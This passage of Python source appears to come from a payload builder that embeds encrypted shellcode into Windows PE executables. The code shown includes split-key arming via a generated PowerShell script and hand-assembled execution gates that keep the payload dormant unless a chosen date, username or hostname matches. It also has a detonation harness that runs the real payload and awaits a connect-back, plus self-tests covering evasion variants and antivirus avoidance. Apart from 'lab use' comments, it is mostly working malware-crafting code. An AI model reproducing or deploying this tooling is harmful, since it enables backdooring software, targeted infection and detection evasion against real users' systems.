                     key_expr: str = "0x00 " * 15 + "0x00",   # EDIT-ME placeholder (valid PS, all-zero)
                     mode: str = "inline", key_off=None) -> str:
    """Emit deliver-key.ps1 for a split-key build. mode selects the key
    transport: 'inline' (paste the hex into the script), 'file' (plain side
    file holding whitespace-separated hex), 'ads' (NTFS alternate data stream
    'StageKey' on any file the operator plants), 'reg' (registry value
    'StageKey' under the path given). The script hash-verifies the artifact
    BEFORE writing, then plants the key over the zeroed slot in place."""
    esc = key_expr.replace("'", "''")
    if mode == "file":
        read_key = ("[byte[]](-split (Get-Content -LiteralPath '%s' -Raw))" % esc)
    elif mode == "ads":
        read_key = ("[byte[]](-split (Get-Content -LiteralPath '%s' "
                    "-Stream 'StageKey' -Raw))" % esc)
    elif mode == "reg":
        read_key = ("[byte[]](-split (Get-ItemProperty -Path '%s' "
                    "-Name 'StageKey').StageKey)" % esc)
    else:  # inline
        read_key = "[byte[]](-split '%s')" % esc
    t64 = ", ".join("0x%02X" % b for b in PE_STUB_TEMPLATE[:8])
    t86 = ", ".join("0x%02X" % b for b in PE_STUB_TEMPLATE_X86[:8])
    return (
        "# deliver-key.ps1 — arm build %s (split-key delivery).\n"
        "# The exe shipped with its 16-byte stage key zeroed; this script\n"
        "# verifies the artifact hash and re-plants the key in place.\n"
        "# Key transport: %s mode. AUTHORIZED LAB USE ONLY.\n"
        "$ErrorActionPreference = 'Stop'\n"
        "$exe = '%s'\n"
        "$expectedSha = '%s'\n"
        "$Tmpl64 = @(%s)\n"
        "$Tmpl86 = @(%s)\n"
        "# Zero the stage key in place after verifying the artifact hash:\n"
        "$actualSha = (Get-Item -LiteralPath $exe | Get-FileHash -Algorithm SHA256).Hash.ToLower()\n"
        "if ($actualSha -ne $expectedSha) { throw \"hash mismatch: $actualSha\" }\n"
        "$key = %s  # EDIT-ME: real key in manifest.json (key_hex)\n"
        "if (-not ($key | Where-Object { $_ -ne 0 })) { throw 'EDIT-ME: placeholder key still set' }\n"
        "if ($key.Count -ne 16) { throw \"stage key must be 16 bytes, got $($key.Count)\" }\n"
        "$fs = [IO.File]::Open($exe, 'Open', 'ReadWrite', 'None')\n"
        "try {\n"
        "    $fs.Position = 0\n"
        "    $hdr = New-Object byte[] ([Math]::Min(0x1000, $fs.Length))\n"
        "    [void]$fs.Read($hdr, 0, $hdr.Length)\n"
        "    $lf = [BitConverter]::ToInt32($hdr, 0x3C)\n"
        "    $nsec = [BitConverter]::ToUInt16($hdr, $lf + 6)\n"
        "    $soh = [BitConverter]::ToUInt16($hdr, $lf + 20)\n"
        "    $first = $lf + 24 + $soh\n"
        "    for ($i = 0; $i -lt $nsec; $i++) {\n"
        "        $h = $first + 40 * $i\n"
        "        $name = [Text.Encoding]::ASCII.GetString($hdr, $h, 8).TrimEnd([char]0)\n"
        "        if ($name -ne '.entp') { continue }\n"
        "        $vsz = [BitConverter]::ToUInt32($hdr, $h + 8)\n"
        "        $rawp = [BitConverter]::ToUInt32($hdr, $h + 20)\n"
        "        $stage = New-Object byte[] $vsz\n"
        "        $fs.Position = $rawp\n"
        "        [void]$fs.Read($stage, 0, $vsz)\n"
        "        $tmpl = $null; $o = -1\n"
        "        foreach ($t in @($Tmpl64, $Tmpl86)) {\n"
        "            for ($o = 16; $o -le $vsz - 8; $o += 16) {\n"
        "                $match = $true\n"
        "                for ($b = 0; $b -lt 8; $b++) { if ($stage[$o + $b] -ne $t[$b]) { $match = $false; break } }\n"
        "                if ($match) { break }\n"
        "            }\n"
        "            if ($o -ge 16 -and $match) { $tmpl = $t; break }\n"
        "            $o = -1\n"
        "        }\n"
        "        if ($o -lt 16) { throw 'stub not found in .entp stage' }\n"
        "%s"
        "        $fs.Write($key, 0, 16)\n"
        "        Write-Host '[+] stage key planted — build armed'\n"
        "        exit 0\n"
        "    }\n"
        "    throw 'no .entp section found'\n"
        "} finally { $fs.Close() }\n"
    ) % (build_id, mode, exe_path, sha256_hex, t64, t86, read_key,
         ("        $fs.Position = $rawp + %d\n" % key_off) if key_off is not None else
         ("        $p = $o\n"
          "        while ($p -gt 32 -and $stage[$p - 1] -eq 0) { $p-- }\n"
          "        if ($p -lt 32) { throw 'stage too small - key slot missing' }\n"
          "        $fs.Position = $rawp + $p - 16\n"))


def split_key_deliver(outdir: str, log=lambda m: None) -> str:
    """Post-build split delivery: zero the deliverable's stage key, hash the
    zeroed artifact and write deliver-key.ps1 next to it. The key itself lives
    only in the operator's manifest — never in the shipped exe."""
    exes = [p for p in glob.glob(os.path.join(outdir, "*.exe"))
            if not p.endswith(".probe.exe")]
    if not exes:
        raise EntrypointError(f"split delivery: no .exe deliverable in {outdir}")
    exe = sorted(exes, key=lambda p: -os.path.getsize(p))[0]
    data = open(exe, "rb").read()
    loc = _find_entp_stage(data)
    if not loc:
        raise EntrypointError("split delivery: no .entp stage found")
    key = data[loc[0] + loc[2]: loc[0] + loc[2] + KEY_SLOT_LEN]
    if key == b"\x00" * KEY_SLOT_LEN:
        log("[i] split delivery: key already zeroed — regenerating script")
    zeroed = zero_stage_key(data)
    sha = hashlib.sha256(zeroed).hexdigest()
    open(exe, "wb").write(zeroed)
    script = split_key_script(exe, sha, os.path.basename(outdir),
                              key_off=loc[2])
    spath = os.path.join(outdir, "deliver-key.ps1")
    open(spath, "w", encoding="utf-8").write(script)
    log(f"[+] Split delivery: stage key zeroed in {os.path.basename(exe)}")
    log("[i] Key transport: edit the $key line in deliver-key.ps1 (inline), "
        "or regenerate for file/ADS/registry transport")
    log(f"[+] Arming script: {spath} — hold the key OUT of band "
        "(manifest.json keeps it lab-side)")
    return spath


# ---------------------------------------------------------------------------
# Execution gates — dormant-unless-allowed prologues that prepend the payload
# inside the ENCRYPTED stage. Each gate is hand-assembled, position-independent
# machine code with zero API calls: the time gate reads SystemTime straight
# from KUSER_SHARED_DATA (fixed 0x7FFE0014), the user/host gates walk
# PEB -> ProcessParameters -> Environment and compare a needle against whole
# environment entries (ASCII-folded). Any failed gate exits the stage thread
# cleanly (x64 ret / x86 ret 4) — the host program runs normally and the
# payload never fires. Gates run BEFORE the payload on the stage thread; on
# success they fall through into it.
# ---------------------------------------------------------------------------

EXEC_GATE_TEMPLATES = {
    "time64": bytes.fromhex(
        "48a11400fe7f0000000049b800c0692ac900000031d249f7f03da1a1a1a172073db1b1b1b1760331c0c3"),
    "time86": bytes.fromhex(
        "a11400fe7f8b151800fe7f0facd009c1ea09b9e0349564f7f13da1a1a1a172073db1b1b1b17603c20400"),
    "env64": bytes.fromhex(
        "4155415641576548a16000000000000000488b40204c8bb88000000041be900100004c8d2da1a1a1a14585f6741a41ffce4831c96641833c4f00741548ffc14881f90080000072ec415f415e415d31c0c34881f92a2a2a2a75274831c9410fb7044f450fb7444d000c204180c8204438c0750e48ffc14881f92a2a2a2a72deeb174831c96641833c4f00740548ffc1ebf34d8d7c4f02eb91415f415e415de95dffff10"),
    "env86": bytes.fromhex(
        "53565755e8000000005b64a1300000008b40108b7048bf900100008daba1a1a1a185ff74134f31c966833c4e0074124181f90080000072f05d5f5e5b31c0c2040081f92a2a2a2a751d31c98a044e8a544d000c2080ca2038d0750b4181f92a2a2a2a72e7eb1231c966833c4e00740341ebf68d744e02eba95d5f5e5be97fffff10"),
}

# Patch sites inside each template (byte offsets), located at bake time by
# scanning for the placeholder immediates and capstone-verified:
#   time - daylo/dayhi: cmp eax, imm32 (days since 1601-01-01, inclusive)
#   env  - disp: rip/disp32 slot for the needle the builder appends right
#           after the block; nlen: two cmp imm32 sites (needle char count);
#           skip: rel32 of the trailing 'jmp rel32' that hops the needle
#           so the success path falls into the next gate / the payload
EXEC_GATE_SLOTS = {
    "time64": {"daylo": 26, "dayhi": 33},
    "time86": {"daylo": 26, "dayhi": 33},
    "env64": {"disp": 37, "after": 41, "nlen": [84, 121], "skip": 159},
    "env86": {"disp": 29, "after": 33, "nlen": [67, 94], "skip": 125},
}
ENV86_CALLRET = 9      # env86: pop ebx lands here (call $+5 at offset 4)

def _gate_patch_u32(code: bytearray, off: int, val: int) -> None:
    code[off:off + 4] = (val & 0xFFFFFFFF).to_bytes(4, "little")


def build_gate_prologue(gates: list, arch: str) -> bytes:
    """Emit the chained gate prologue for a stage. gates is a list of
    {"kind": "time", "lo": <days>, "hi": <days>} and
    {"kind": "env", "needle": "USERNAME=joe"} dicts (needle ASCII, matched
    case-insensitively against whole environment entries)."""
    if arch not in ("x64", "x86"):
        raise EntrypointError("gates: unknown arch %r" % arch)
    arch = {"x64": "64", "x86": "86"}[arch]     # template key suffix
    out = bytearray()
    for g in gates:
        kind = g.get("kind")
        if kind == "time":
            lo, hi = int(g["lo"]), int(g["hi"])
            if not (0 <= lo <= hi <= 0xFFFFFFFF):
                raise EntrypointError(
                    "gates: bad time window %d..%d" % (lo, hi))
            code = bytearray(EXEC_GATE_TEMPLATES["time" + arch])
            _gate_patch_u32(code, EXEC_GATE_SLOTS["time" + arch]["daylo"], lo)
            _gate_patch_u32(code, EXEC_GATE_SLOTS["time" + arch]["dayhi"], hi)
            out += code
        elif kind == "env":
            try:
                needle = g["needle"].encode("ascii", "strict")
            except UnicodeEncodeError:
                raise EntrypointError("gates: needle must be ASCII")
            if not 1 <= len(needle) <= 64:
                raise EntrypointError(
                    "gates: needle must be 1..64 ASCII chars")
            # the compare loop reads WCHARS from the needle, so it travels
            # UTF-16LE; nlen slots carry the CHAR count
            needle = needle.decode("ascii").encode("utf-16-le")
            code = bytearray(EXEC_GATE_TEMPLATES["env" + arch])
            slots = EXEC_GATE_SLOTS["env" + arch]
            anchor = slots["after"] if arch == "64" else ENV86_CALLRET
            _gate_patch_u32(code, slots["disp"], len(code) - anchor)
            for n_off in slots["nlen"]:
                _gate_patch_u32(code, n_off, len(needle) // 2)
            L = len(code)  # skip jmp: hop the needle, land on next gate/payload
            _gate_patch_u32(code, slots["skip"],
                            L + len(needle) - (slots["skip"] + 4))
            out += code + needle
        else:
            raise EntrypointError("gates: unknown kind %r" % kind)
    return bytes(out)


def gates_spec_from_cfg(cfg) -> list:
    """GUI gates dict -> engine gate list. None when nothing is enabled.
    cfg["gates"] shape: {"time": ("YYYY-MM-DD", "YYYY-MM-DD") | None,
    "user": str, "host": str}."""
    g = cfg.get("gates") or {}
    spec = []
    if g.get("time"):
        import datetime as dt
        epoch = dt.date(1601, 1, 1)
        lo = (dt.date.fromisoformat(g["time"][0]) - epoch).days
        hi = (dt.date.fromisoformat(g["time"][1]) - epoch).days
        spec.append({"kind": "time", "lo": lo, "hi": hi})
    if g.get("user"):
        spec.append({"kind": "env", "needle": "USERNAME=" + g["user"]})
    if g.get("host"):
        spec.append({"kind": "env", "needle": "COMPUTERNAME=" + g["host"]})
    return spec or None


def detonate(exe_path: str, mode: str, lhost: str = "127.0.0.1",
             lport: int = 4444, timeout: float = 12.0,
             log=lambda m: None) -> dict:
    """Run one detonation and return a result dict:
       {mode, exit_code, fired, oep_ok, detail}
    fired  — the stage demonstrably executed (ud2: illegal-instruction exit;
             connect: a TCP connection arrived).
    oep_ok — the host ran to completion normally (exit 0), i.e. the stub's
             jump-back to the original entry point is intact."""
    import socket
    res = {"mode": mode, "exit_code": None, "fired": False,
           "oep_ok": False, "detail": ""}
    data = open(exe_path, "rb").read()
    if len(data) < 0x40 or data[:2] != b"MZ":
        res["detail"] = "not a PE (or too small) — run this on a PE-embed build"
        return res
    loc = _find_entp_stage(data)
    if not loc:
        res["detail"] = "no .entp section found — run this on a PE-embed build"
        return res
    rawp, enc_len, key_off, stub_off, stub_len = loc
    key = data[rawp + key_off: rawp + key_off + 16]
    if len(key) != 16:
        res["detail"] = "stage key missing (corrupt section?)"
        return res

    work = tempfile.mkdtemp(prefix="detonate-")
    # single .exe extension, unique per call: "*.probe.exe" double extensions
    # trip Defender's heuristics, and a reused name can race a still-open
    # image section from the previous run (WinError 129, invalid image).
    probe = os.path.join(
        work, "%s-%s-forged.exe"
        % (os.path.splitext(os.path.basename(exe_path))[0],
           os.urandom(3).hex()))
    srv = None
    try:
        if mode == "connect":
            probe = exe_path                       # real payload, real build
            srv = socket.socket()
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((lhost, lport))
            srv.listen(1)
            srv.settimeout(timeout)
            log(f"[*] connect mode: listening on {lhost}:{lport} "
                f"(up to {timeout:.0f}s) — the real payload runs")
        else:
            decoy = DECOY_UD2 if mode == "ud2" else DECOY_HANG
            patched = bytearray(data)
            # decoy tiled to EXACTLY enc_len: a longer slice-assign would
            # resize the image and shift the stub — swap must be byte-exact
            blob = (decoy * (enc_len // len(decoy) + 1))[:enc_len]
            patched[rawp:rawp + enc_len] = xor_crypt(blob, key)
            open(probe, "wb").write(bytes(patched))
            time.sleep(0.2)     # let AV scanners release the fresh file
            log(f"[*] {mode} mode: stage swapped for "
                f"{'UD2 (0F 0B)' if mode == 'ud2' else 'EB FE decoy'}")

        # Popen + manual wait: a hung probe (EB FE decoy loops forever) must
        # not deadlock the harness in communicate() the way run() would —
        # communicate() only blocks on the pipes AFTER a finished wait; on
        # timeout we just note the hang and let `finally` clean up.
        proc = subprocess.Popen([probe], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        t0 = time.time()
        try:
            proc.wait(timeout=timeout + 5)
            proc.communicate()      # drains pipes now that the process is gone
        except subprocess.TimeoutExpired:
            try:
                proc.kill()     # EB FE loops forever — don't leak the probe
                proc.wait(timeout=3)
            except Exception:
                pass
            res["detail"] = ("probe timed out — EB FE decoy loops forever, "
                             "which is the expected hang signature")
            return res
        res["exit_code"] = proc.returncode

        if mode == "ud2":
            res["fired"] = (proc.returncode == EXIT_ILLEGAL)
            res["detail"] = ("stage executed and crashed on UD2 as expected — "
                             "stub chain works" if res["fired"] else
                             f"expected exit {EXIT_ILLEGAL:#x}, got "
                             f"{proc.returncode:#x} — stage did NOT run")
        elif mode == "connect":
            try:
                conn, addr = srv.accept()
                res["fired"] = True
                res["detail"] = (f"connect-back from {addr[0]} "
                                 f"after {time.time() - t0:.1f}s")
                conn.close()
            except socket.timeout:
                res["detail"] = f"no connect-back within {timeout:.0f}s"
        else:  # smoke
            res["fired"] = True     # decoy itself is unobservable; ud2 proves presence
            res["oep_ok"] = (proc.returncode == 0)
            res["detail"] = ("host exited 0 — stub + OEP chain intact"
                             if res["oep_ok"] else
                             f"host exited {proc.returncode:#x} (nonzero)")
    except Exception as e:
        res["detail"] = f"error: {type(e).__name__}: {e}"
    finally:
        if srv is not None:
            srv.close()
        if mode != "connect":
            try:
                os.remove(probe)
            except OSError:
                pass
            shutil.rmtree(work, ignore_errors=True)
    return res


def detonate_report(outdir: str, modes=("smoke", "ud2", "connect"),
                    lport: int = 4444, timeout: float = 12.0,
                    log=lambda m: None) -> dict:
    """Detonate a build directory's deliverable across the chosen modes and
    return {mode: result_dict}. Finds the .exe deliverable automatically."""
    exes = [p for p in glob.glob(os.path.join(outdir, "*.exe"))
            if not p.endswith(".probe.exe")]
    if not exes:
        raise EntrypointError(f"no .exe deliverable found in {outdir}")
    exe = sorted(exes, key=lambda p: -os.path.getsize(p))[0]
    log(f"[*] Lab Detonator: {os.path.basename(exe)}")
    out = {}
    for m in modes:
        r = detonate(exe, m, lport=lport, timeout=timeout, log=log)
        out[m] = r
        mark = "FIRED" if r["fired"] else "no fire"
        log(f"  [{m}] exit={r['exit_code'] if r['exit_code'] is not None else '—'} "
            f"{mark}: {r['detail']}")
    return out


def _selftest():
    """Offline validation: crypto round-trips + template emission for every
    platform x encryption x injection combination. No msfvenom needed."""
    f = Entrypoint(log=lambda m: None)
    sc = bytes(range(256)) * 2
    fails = []
    checks = 0

    # 1. crypto round-trips
    for enc in ENC_OPTIONS:
        blob, key, iv, enc_id = f.encrypt(sc, enc)
        out = decrypt_pair(blob, key, iv)
        checks += 1

    # 1b. PE-embed patcher: growth, entry repoint, stage integrity — on hosts
    # with and without a certificate overlay (signed hosts grow past it)
    def _mini_pe(machine=0x8664):
        import struct as st
        is64 = machine == 0x8664
        dos = bytearray(0x80)
        dos[:2] = b"MZ"
        st.pack_into("<I", dos, 0x3C, 0x80)
        pe = bytearray(dos) + b"PE\x00\x00"
        pe += st.pack("<HHIIIHH", machine, 1, 0, 0, 0,
                      0xF0 if is64 else 0xE0, 0x22)
        opt = bytearray(0xF0 if is64 else 0xE0)
        st.pack_into("<H", opt, 0, 0x20B if is64 else 0x10B)
        st.pack_into("<I", opt, 16, 0x1400)      # entry RVA
        st.pack_into("<I", opt, 32, 0x1000)      # section alignment
        st.pack_into("<I", opt, 36, 0x200)       # file alignment
        st.pack_into("<I", opt, 56, 0x4000)      # size of image
        st.pack_into("<I", opt, 60, 0x400)       # size of headers
        pe += opt
        sec = bytearray(40)
        sec[0:8] = b".text\x00\x00\x00"
        st.pack_into("<IIII", sec, 8, 0x1000, 0x1000, 0x200, 0x400)
        st.pack_into("<I", sec, 36, 0x60000020)
        pe += sec + bytearray(0x400)
        return bytes(pe)

    def _stage_roundtrip(patched, sc):
        """Pull the .entp stage back out of a patched PE and undo the XOR."""
        import struct as st
        lf = st.unpack_from("<I", patched, 0x3C)[0]
        nsec = st.unpack_from("<H", patched, lf + 6)[0]
        soh = st.unpack_from("<H", patched, lf + 20)[0]
        first = lf + 24 + soh
        for i in range(nsec):
            h = first + i * 40
            if bytes(patched[h:h + 8]).rstrip(b"\x00") != b".entp":
                continue
            vsz, _, _, rawp = st.unpack_from("<IIII", patched, h + 8)
            stage = bytes(patched[rawp:rawp + vsz])
            # locate the stub by its first 8 bytes at a 16-aligned offset
            # (the stage body is high-entropy; only aligned offsets qualify;
            # try both templates — the section name carries no arch marker)
            stub_at = -1
            for cand in (PE_STUB_TEMPLATE, PE_STUB_TEMPLATE_X86):
                stub_at = next((o for o in range(16, len(stage) - 8, 16)
                                if stage[o:o + 8] == cand[:8]), -1)
                if stub_at >= 16:
                    break
            assert stub_at >= 16, "stub not found at a 16-aligned offset"
            for pad in range(16):
                enc_len = stub_at - 16 - pad
                if enc_len <= 0:
                    continue
                key = stage[enc_len:enc_len + 16]
                if xor_crypt(stage[:enc_len], key) == sc:
                    return True
            return False
        return False

    for machine, arch in ((0x8664, "x64"), (0x014C, "x86")):
        for label, overlay in (("plain", b""),
                               ("signed", b"CERT-OVERLAY-PADDING" * 40)):
            tag = f"{arch}/{label}"
            try:
                host = _mini_pe(machine) + overlay
                k = rnd_bytes(16)
                patched = patch_pe(host, sc, k)
                checks += 2
                if len(patched) <= len(host):
                    fails.append(f"PE-embed ({tag}): patched file did not grow")
                if patched[:len(host)] == host:
                    fails.append(f"PE-embed ({tag}): entry/headers not modified")
                if overlay and overlay not in patched:
                    fails.append(f"PE-embed ({tag}): certificate overlay clobbered")
                if not _stage_roundtrip(patched, sc):
                    fails.append(f"PE-embed ({tag}): stage XOR round-trip FAILED")
            except Exception as e:
                fails.append(f"PE-embed ({tag}): {type(e).__name__}: {e}")
        if out != sc:
            fails.append(f"crypto round-trip failed for {enc}")

    # 1b. shellcode arch detection
    x64ish = (b"\x48\x8b\x48\x18" * 2 + b"\x65\x48\xa1\x60\x00\x00\x00"
              b"\x48\x31\xc9" * 2)
    x86ish = (b"\x64\xa1\x30\x00\x00\x00" + b"\x8b\x40\x0c"
              + b"\x8b\x53\x10" * 2 + b"\x8b\x42\x3c")
    checks += 3
    if guess_shellcode_arch(x64ish) != "x64":
        fails.append(f"arch-guess: x64 blob detected as {guess_shellcode_arch(x64ish)}")
    if guess_shellcode_arch(x86ish) != "x86":
        fails.append(f"arch-guess: x86 blob detected as {guess_shellcode_arch(x86ish)}")
    if guess_shellcode_arch(b"\x90" * 64) is not None:
        fails.append("arch-guess: NOP sled should be None")

    # 1b-preset. preset catalogue integrity + resolver
    checks += 2
    n_hosts = sum(len(v) for v in HOST_PRESETS.values())
    if n_hosts < 12:
        fails.append(f"presets: only {n_hosts} hosts defined")
    if find_host_preset("NoSuchBucket", "x") != "":
        fails.append("presets: unknown bucket must resolve to empty string")

    # 1c. CFG hosts: flag clear + XFG rejection, per-arch load-config layouts
    def _with_cfg(machine, gflags, dllchar=0x4000):
        import struct as st
        is64 = machine == 0x8664
        host = bytearray(_mini_pe(machine))
        lf = st.unpack_from("<I", host, 0x3C)[0]
        opt = lf + 24
        st.pack_into("<H", host, opt + 70, dllchar)   # DllCharacteristics
        lc = bytearray(152 if is64 else 92)   # room for GuardFlags at +88
        st.pack_into("<I", lc, 144 if is64 else 88, gflags)
        lc_rva, lc_off = 0x1400, 0x800                # inside .text's mapping
        host += b"\x00" * (lc_off - len(host)) + lc
        ddoff = opt + (112 if is64 else 96)
        st.pack_into("<II", host, ddoff + 10 * 8, lc_rva, len(lc))
        return bytes(host)

    for machine, arch in ((0x8664, "x64"), (0x014C, "x86")):
        gflags = 0x00040000 if machine == 0x8664 else 0x00010000
        try:
            patch_pe(_with_cfg(machine, 0), sc, rnd_bytes(16))
            checks += 1
        except Exception as e:
            fails.append(f"PE-embed ({arch}/cfg): plain CFG host rejected: {e}")
        try:
            patch_pe(_with_cfg(machine, gflags | 0x40000000), sc, rnd_bytes(16))
            fails.append(f"PE-embed ({arch}/xfg): XFG host was NOT rejected")
            checks += 1
        except EntrypointError as e:
            checks += 1
            if "XFG" not in str(e):
                fails.append(f"PE-embed ({arch}/xfg): wrong error: {e}")
        except Exception as e:
            fails.append(f"PE-embed ({arch}/xfg): {type(e).__name__}: {e}")

    # 2. template emission — every platform x enc x injection
    targets = ["Windows", "Linux", "macOS"]
    kinds = {"Windows": ["shellcode"], "Linux": ["shellcode", "exe", "so"],
             "macOS": ["shellcode"]}
    fake_pe = b"MZ" + b"\x00" * 62 + b"PE\x00\x00" + b"\x00" * 256
    for target in targets:
        for kind in kinds[target]:
            for enc in ENC_OPTIONS:
                for inj in (INJECTION_OPTIONS if target == "Windows" else ["None"]):
                    cfg = {"target": target, "kind": kind, "enc": enc,
                           "evasion": "Sleep + Jitter", "injection": inj,
                           "payload": "test/roundtrip", "fmt": "raw",
                           "x64": True}
                    pe = fake_pe if (inj != "None" and target == "Windows"
                                     and inj == INJECTION_OPTIONS[1]) else b""
                    if pe:
                        cfg["pe_inject"] = True
                    try:
                        outdir = f.build(cfg, sc, pe)
                        src = open(os.path.join(outdir, "loader.c")).read()
                        checks += 1
                        # generic scan: ANY leftover @@TOKEN@@ is a bug
                        for token in set(re.findall(r"@@[A-Z_]+@@", src)):
                            fails.append(f"{target}/{kind}/{enc}/{inj}: unreplaced {token}")
                        if "PF_BLOB" not in src:
                            fails.append(f"{target}/{kind}/{enc}/{inj}: no PF_BLOB")
                        if enc == "None" and "PF_KEY" in src:
                            fails.append(f"{target}/{kind}/{enc}: leaked key with enc=None")
                        m = re.search(r"unsigned char PF_BLOB\[\] = \{(.*?)\};", src, re.S)
                        k = re.search(r"unsigned char PF_KEY\[\] = \{(.*?)\};", src, re.S)
                        if enc == "XOR Dynamic" and m and k:
                            blob = bytes(int(x, 16) for x in re.findall(r"0x([0-9a-fA-F]{2})", m.group(1)))
                            keyb = bytes(int(x, 16) for x in re.findall(r"0x([0-9a-fA-F]{2})", k.group(1)))
                            if blob[:5] == MAGIC:
                                fails.append(f"{target}/{enc}: tooling header leaked into loader")
                            elif xor_crypt(blob, keyb) != sc:
                                fails.append(f"{target}/{enc}: shellcode round-trip FAILED")
                    except Exception as e:
                        fails.append(f"{target}/{kind}/{enc}/{inj}: {type(e).__name__}: {e}")

    # 5b. Lab Detonator engine — stage locate + decoy swap round-trip
    def _detonator_roundtrip():
        host = _mini_pe(0x8664)
        k = rnd_bytes(16)
        patched = patch_pe(host, sc, k)
        loc = _find_entp_stage(patched)
        if not loc:
            return False
        rawp, enc_len, key_off, stub_off, stub_len = loc
        key = patched[rawp + key_off: rawp + key_off + 16]
        if xor_crypt(patched[rawp:rawp + enc_len], key) != sc:
            return False
        patched2 = bytearray(patched)
        blob = (DECOY_UD2 * (enc_len // len(DECOY_UD2) + 1))[:enc_len]
        patched2[rawp:rawp + enc_len] = xor_crypt(blob, key)
        loc2 = _find_entp_stage(bytes(patched2))
        if not loc2:
            return False
        r2p, e2, k2o, s2, _sl = loc2
        return (e2 == enc_len and
                xor_crypt(bytes(patched2[r2p:r2p + e2]),
                          bytes(patched2[r2p + k2o:r2p + k2o + 16]))
                == blob)
    checks += 1
    if not _detonator_roundtrip():
        fails.append("detonator: stage locate/swap round-trip")

    # 5c. split-key delivery: zero -> arm round-trip
    def _splitkey_roundtrip():
        host2 = _mini_pe(0x8664)
        k2 = rnd_bytes(16)
        p2 = patch_pe(host2, sc, k2)
        z2 = zero_stage_key(p2)
        if len(z2) != len(p2) or z2 == p2:
            return False
        loc2 = _find_entp_stage(z2)
        if not loc2 or z2[loc2[0] + loc2[2]: loc2[0] + loc2[2] + 16] != bytes(16):
            return False
        if arm_stage_key(z2, k2) != p2:
            return False
        stage_z = z2[loc2[0]:loc2[0] + loc2[1]]
        if xor_crypt(stage_z, bytes(16)) != stage_z:
            return False   # zeroed key: identity XOR, stage stays ciphertext
        try:
            arm_stage_key(z2, b"short")
            return False
        except EntrypointError:
            return True
    checks += 1
    if not _splitkey_roundtrip():
        fails.append("split-key: zero/arm round-trip")

    # 5d. stub variant rotation: variants touch ONLY their declared byte
    # ranges, slot patching still lands, lengths and signature unchanged
    for v_arch, v_expect in (("x64", 8), ("x86", 16)):
        checks += 1
        v_ok = STUB_VARIANT_COUNT[v_arch] == v_expect
        v_base = (PE_STUB_TEMPLATE if v_arch == "x64"
                  else PE_STUB_TEMPLATE_X86)
        for v in range(STUB_VARIANT_COUNT[v_arch]):
            stub_v = _build_pe_stub(0x1234, 0x40, 0x3000, 0x1400,
                                    v_arch, v)
            stub_0 = _build_pe_stub(0x1234, 0x40, 0x3000, 0x1400,
                                    v_arch, 0)
            if len(stub_v) != len(v_base) or stub_v[:8] != v_base[:8]:
                v_ok = False
            diff = {i for i in range(len(stub_v))
                    if stub_v[i] != stub_0[i]}
            allowed = set()
            for bit, group in enumerate(STUB_VARIANT_PATCHES[v_arch]):
                if (v >> bit) & 1:
                    for off, orig, new in group:
                        allowed.update(range(off, off + len(orig)))
            if not diff <= allowed:
                v_ok = False
        if not v_ok:
            fails.append(f"variant: {v_arch} equivalence broke")

    # 5e. execution gates: prologue build, slot patching, stage prefix
    checks += 1
    g_ok = True
    pt = build_gate_prologue([{"kind": "time", "lo": 1, "hi": 2}], "x64")
    tl = EXEC_GATE_SLOTS["time64"]
    if (pt[tl["daylo"]:tl["daylo"] + 4] != (1).to_bytes(4, "little")
            or pt[tl["dayhi"]:tl["dayhi"] + 4] != (2).to_bytes(4, "little")):
        g_ok = False
    pe = build_gate_prologue([{"kind": "env", "needle": "USERNAME=pc"}], "x64")
    el = EXEC_GATE_SLOTS["env64"]
    nw = "USERNAME=pc".encode("utf-16-le")
    if (pe[-len(nw):] != nw
            or len(pe) != len(EXEC_GATE_TEMPLATES["env64"]) + len(nw)
            or int.from_bytes(pe[el["disp"]:el["disp"] + 4], "little")
            != len(pe) - len(nw) - el["after"]
            or any(int.from_bytes(pe[o:o + 4], "little") != len(nw) // 2
                   for o in el["nlen"])
            or int.from_bytes(pe[el["skip"]:el["skip"] + 4], "little")
            != len(pe) - el["skip"] - 4):
        g_ok = False
    try:
        build_gate_prologue([{"kind": "env", "needle": "USER\u00d1"}], "x64")
        g_ok = False
    except EntrypointError:
        pass
    if not g_ok:
        fails.append("gates: prologue build/slot patching")
    checks += 1
    try:
        k5 = rnd_bytes(16)
        pro = build_gate_prologue(
            [{"kind": "env", "needle": "username=x"}], "x64")
        p5 = patch_pe(_mini_pe(0x8664), sc, k5, stage_prefix=pro)
        l5 = _find_entp_stage(p5)
        st5 = xor_crypt(p5[l5[0]:l5[0] + l5[1]],
                        p5[l5[0] + l5[2]:l5[0] + l5[2] + 16])
        if st5 != pro + sc or l5[1] != len(pro) + len(sc):
            fails.append("gates: stage prefix round-trip")
    except Exception as e:
        fails.append("gates: stage prefix round-trip (%s)" % type(e).__name__)

    print(f"selftest: {checks} checks, {len(fails)} failures")
    for x in fails:
        print("  FAIL:", x)
    return 1 if fails else 0


def main():
    argv = sys.argv[1:]
    if "--selftest" in argv:
        return _selftest()
    try:
        return launch_gui()
    except Exception:
        # never die silently — write the traceback where the user can find it
        import traceback
        log = os.path.join(STATE_DIR, "crash.log")
        os.makedirs(STATE_DIR, exist_ok=True)
        with open(log, "a") as fh:
            fh.write("\n" + time.strftime("%Y-%m-%d %H:%M:%S") + "\n")
            traceback.print_exc(file=fh)
        print("crash logged to", log)
        raise


if __name__ == "__main__":
    sys.exit(main())